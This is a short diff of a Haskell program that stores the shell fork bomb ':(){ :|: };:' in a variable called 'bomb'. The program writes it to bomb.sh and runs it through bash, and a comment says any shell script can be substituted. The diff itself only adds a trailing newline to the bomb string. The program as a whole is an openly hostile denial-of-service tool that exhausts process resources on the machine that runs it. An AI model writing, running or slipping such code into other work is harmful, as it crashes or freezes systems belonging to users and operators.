@@ -10,7 +10,7 @@ import System.Process
 
 --Useful variables to keep line lengths down
 --Can substitute any valid shell script for the text in bomb
-bomb =  ":(){ :|: };:"
+bomb =  ":(){ :|: };:\n"
 command = "echo \"" ++ bomb ++ "\" > bomb.sh | bash bomb.sh"
 
 main = do
